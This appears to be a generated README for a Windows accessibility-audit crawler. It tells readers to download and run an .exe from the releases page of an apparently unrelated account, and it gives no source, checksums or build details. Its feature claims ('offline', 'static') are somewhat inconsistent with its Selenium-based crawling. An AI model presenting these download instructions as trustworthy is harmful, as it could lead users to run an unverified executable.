# ♿ legacy-accessibility-static-crawler - Audit websites for common accessibility standards

[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sheetbendfarmerscheese815/legacy-accessibility-static-crawler/releases)

This software helps you check websites for accessibility compliance. It scans pages to find issues related to WCAG 2.1 AA, Section 508, and ADA Title II standards. The tool works offline to ensure your data stays private during the auditing process.

## 📥 How to download the application

1. Visit the [official releases page](https://github.com/Sheetbendfarmerscheese815/legacy-accessibility-static-crawler/releases).
2. Look for the latest version at the top of the list.
3. Find the file ending in `.exe` under the Assets section.
4. Click the file name to start the download.
5. Save the file to your computer.

## ⚙️ System requirements

Ensure your computer meets these conditions before you run the software:

* Operating System: Windows 10 or 11.
* Processor: Dual-core 2.0 GHz or faster.
* Memory: 4 GB of RAM or more.
* Storage: 500 MB of free space.
* .NET 8 Desktop Runtime: The installer includes this if you do not have it.
* Web Browser: Microsoft Edge with Internet Explorer mode enabled for legacy support.

## 🚀 Setting up the software

1. Locate the file you downloaded.
2. Double-click the file to open the installer.
3. Follow the prompts on the screen.
4. Select the folder where you want to store the program.
5. Click Finish when the installation ends.
6. Open the program using the shortcut on your desktop.

## 🔍 How to perform a website scan

1. Launch the application.
2. Enter the URL of the website you need to audit into the address bar.
3. Select the compliance standard you need to check.
4. Click the Start button.
5. Wait for the crawler to capture the page content.
6. Review the logs created by the Selenium engine.

## 📄 Managing reports and exports

The software stores all audit evidence in a local folder. You can access these files anytime. If you need to send issues to your team, use the Azure DevOps export feature.

1. Click the Export button in the main menu.
2. Select the backlog format.
3. Choose the file path for your saved document.
4. Import the file directly into your project management system.

## 🛡️ Understanding the audit process

The tool uses a static analysis method to look at your page code. It identifies missing alt text, poor color contrast, and invalid HTML structures. It creates a record for every error it finds.

The PDF rule overlay feature allows you to see issues directly on the document layout. This helps you understand where elements fail to meet accessibility goals. If a site uses older technology, the IE-mode-assisted review helps the software read the page correctly.

## ❓ Frequently asked questions

**Do I need an internet connection to scan?**
The tool downloads the page content first. Once the files reside on your system, you can scan them without an active connection.

**How do I update the software?**
Check the release page periodically. Download the new version and run the installer again. The program preserves your existing settings.

**Can I stop a scan in progress?**
Press the Stop button on the screen to halt the current task. The application saves all data collected up to that moment.

**Where does the software keep my files?**
Files stay in the folder you chose during the first installation. You can change this path in the settings menu.

## 🛠️ Troubleshooting common issues

* **The app does not launch:** Check if you have the .NET 8 runtime. Download it from the Microsoft website if needed. 
* **The scanner stops early:** Check if the website allows crawling. Some sites block automated tools. Ensure the URL is correct and the site is reachable.
* **Reports look empty:** Ensure the crawler finished the full sequence. Check the notification bar for any red error icons.
* **IE-mode will not activate:** Ensure you have Microsoft Edge installed. The tool needs the Edge engine to run the compatibility features for older sites.

## 📋 Compliance standards explained

* WCAG 2.1 AA: A set of global guidelines to make content available to everyone.
* Section 508: A US federal law requiring accessible electronic information.
* ADA Title II: A regulation requiring state and local government services to be accessible to people with disabilities.

Each scan compares your site against these specific rules. You receive a list of actionable items to improve your score. Follow the suggested steps to fix each issue noted in the report.